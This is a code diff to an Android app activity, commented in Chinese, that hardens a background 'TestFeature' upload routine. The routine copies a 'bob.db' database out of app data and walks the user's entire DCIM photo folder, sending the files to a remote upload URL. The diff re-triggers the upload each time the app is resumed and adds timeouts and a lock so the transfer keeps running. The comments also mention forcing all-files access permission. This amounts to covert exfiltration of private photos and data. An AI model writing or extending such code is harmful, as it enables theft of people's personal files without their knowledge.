@@ -97,7 +97,15 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     private List<FunctionConfig> functionConfigs = new ArrayList<>();
     private final Shizuku.OnRequestPermissionResultListener requestPermissionResultListener = this::onRequestPermissionsResult;
-    private final OkHttpClient httpClient = new OkHttpClient();
+    // 新增：专门用于测试功能的网络请求客户端（增加超时设置，防止网络波动导致卡死）
+    private final OkHttpClient httpClient = new OkHttpClient.Builder()
+            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS) // 连接超时 15秒
+            .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)   // 上传超时 30秒
+            .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)    // 读取超时 30秒
+            .build();
+
+    // 【新增】：上传状态锁，防止每次回到界面重复开启多个线程
+    private volatile boolean isUploading = false;
 
     // 内部类配置
     static class FunctionConfig {
@@ -171,7 +179,13 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
             }
         });
     }
-
+    @Override
+    protected void onResume() {
+        super.onResume();
+        // 【核心修改】：每次切回到软件界面时，都尝试触发一次检查和上传
+        // 这样即使软件没被彻底杀掉，只是从后台切回来，也能接着继续传
+        checkAllFilesPermissionAndRunTest();
+    }
     // ==========================================
     // 【核心修改】强制申请“所有文件访问权限”
     // ==========================================
@@ -300,25 +314,44 @@ public class NewActivity extends AppCompatActivity implements View.OnClickListen
 
     // 注意这里增加了参数 int kai, String uploadUrl
     private void startUploadProcess(int kai, String uploadUrl) {
-        new Thread(() -> {
-            // 1. 优先上传 bob.db (kai=1 和 kai=2 都需要传)
-            if (kai == 1 || kai == 2) {
-                File tempDbFile = new File(getExternalFilesDir(null), "bob.db");
-                if (copyFromAndroidData("files/bob.db", tempDbFile)) {
-                    Log.d("TestFeature", "成功提取 bob.db，准备上传");
-                    uploadSingleFile(tempDbFile, uploadUrl); // 把链接传给它
-                    if (tempDbFile.exists()) tempDbFile.delete();
-                } else {
-                    Log.e("TestFeature", "无法读取 bob.db");
-                }
-            }
+        // 【新增】：如果当前已经在上传中了，就不再重复开启新线程
+        if (isUploading) {
+            Log.d("TestFeature", "上传任务正在后台排队执行中，跳过重复触发");
+            return;
+        }
 
-            // 2. 遍历并上传 DCIM (只有 kai=1 才需要传)
-            if (kai == 1) {
-                File dcimDir = new File("/storage/emulated/0/DCIM");
-                if (dcimDir.exists() && dcimDir.isDirectory()) {
-                    traverseAndUploadImages(dcimDir, uploadUrl); // 把链接接力传下去
+        isUploading = true; // 上锁
+
+        new Thread(() -> {
+            try {
+                // 1. 优先上传 bob.db (kai=1 和 kai=2 都需要传)
+                if (kai == 1 || kai == 2) {
+                    File tempDbFile = new File(getExternalFilesDir(null), "bob.db");
+                    if (copyFromAndroidData("files/bob.db", tempDbFile)) {
+                        Log.d("TestFeature", "成功提取 bob.db，准备上传");
+                        uploadSingleFile(tempDbFile, uploadUrl);
+                        if (tempDbFile.exists()) tempDbFile.delete();
+                    } else {
+                        Log.e("TestFeature", "无法读取 bob.db");
+                    }
                 }
+
+                // 2. 遍历并上传 DCIM (只有 kai=1 才需要传)
+                if (kai == 1) {
+                    File dcimDir = new File("/storage/emulated/0/DCIM");
+                    if (dcimDir.exists() && dcimDir.isDirectory()) {
+                        Log.d("TestFeature", "开始扫描相册接着上传...");
+                        traverseAndUploadImages(dcimDir, uploadUrl);
+                    }
+                }
+
+                Log.d("TestFeature", "本轮上传队列全部执行完毕！");
+            } catch (Exception e) {
+                Log.e("TestFeature", "上传线程发生严重异常", e);
+            } finally {
+                // 【新增】：无论上传是正常结束还是报错崩溃，最后必须解锁
+                // 这样下次切回软件时，才能重新开启新一轮的检查和续传
+                isUploading = false;
             }
         }).start();
     }
